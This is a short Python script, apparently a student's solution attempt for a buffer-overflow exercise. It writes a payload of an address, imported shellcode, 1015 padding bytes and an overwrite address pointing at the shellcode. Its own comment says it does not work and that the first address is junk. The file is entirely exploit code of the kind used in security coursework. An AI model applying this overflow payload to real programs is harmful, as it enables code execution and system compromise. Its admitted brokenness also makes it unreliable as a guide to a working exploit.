# sol4.py does not work - the address after the A's is the shellcode location in the program but the first address is junk since nothing would work
from shellcode import shellcode
import sys
sys.stdout.buffer.write(b"\x87" + b"\x9c" + b"\x04" + b"\x08" + shellcode + b"A"*1015 + b"\x92" + b"\x44" + b"\x0e" + b"\x08")
